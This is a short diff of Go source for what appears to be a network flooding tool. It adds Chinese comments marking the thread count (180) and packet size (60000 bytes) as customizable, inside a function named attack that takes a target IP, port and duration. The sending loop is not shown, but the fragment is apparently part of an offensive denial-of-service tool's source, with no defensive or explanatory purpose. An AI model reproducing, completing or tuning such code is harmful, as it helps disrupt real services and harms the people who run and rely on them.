@@ -7,9 +7,10 @@ import (
 	"strconv"
 	"time"
 )
-
-const THREADS = 180
+// 定义线程数，可自定义
+const THREADS = 180  
 func attack(ip string, port int, duration int) {
+	// 定义包字节，可自定义
 	bytes := make([]byte, 60000)
 	startTime := time.Now()
 	endTime := startTime.Add(time.Duration(duration) * time.Second)
